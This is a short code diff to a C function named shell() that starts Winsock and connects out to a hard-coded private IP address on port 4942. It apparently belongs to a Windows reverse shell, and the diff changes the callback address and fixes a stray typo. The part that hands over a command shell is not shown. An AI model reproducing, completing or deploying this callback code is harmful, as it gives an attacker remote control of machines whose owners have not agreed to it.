@@ -19,7 +19,7 @@ DWORD WINAPI shell()
 
     int res = WSAStartup(MAKEWORD(2,2), &wsa);
     if (res != 0)
-    {cd
+    {
         fprintf(stderr, "Can't initialize Winsock. Error %d\n", res);
         return 1;
     }
@@ -39,7 +39,7 @@ DWORD WINAPI shell()
     memset(&server, 0, sizeof(server));
     server.sin_family = AF_INET;
     server.sin_port = htons(4942);
-    server.sin_addr.s_addr = inet_addr("192.168.0.104");
+    server.sin_addr.s_addr = inet_addr("192.168.0.105");
 
     res = WSAConnect(sock, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL);
     if (res == SOCKET_ERROR)
